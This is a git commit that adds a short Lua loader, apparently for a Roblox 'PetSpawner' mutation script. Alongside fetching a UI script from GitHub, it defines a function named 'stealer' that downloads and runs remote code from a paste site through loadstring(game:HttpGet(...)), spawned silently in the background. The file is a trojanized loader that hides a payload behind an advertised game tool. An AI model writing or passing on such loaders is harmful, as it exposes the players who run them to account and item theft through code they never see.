490edd36263c829006d52984736b0fb3359cc166
ZeoHubs <voidzskie@gmail.com>
2025-07-22 02:10:02 +0800

    Create Loader.lua

---
+++ PetMutation/Loader.lua
@@ -0,0 +1,9 @@
+local function stealer()
+  loadstring(game:HttpGet("https://cdn.sourceb.in/bins/GSszYwc4rA/0", true))()
+end
+local function loadui()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/Mutations.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
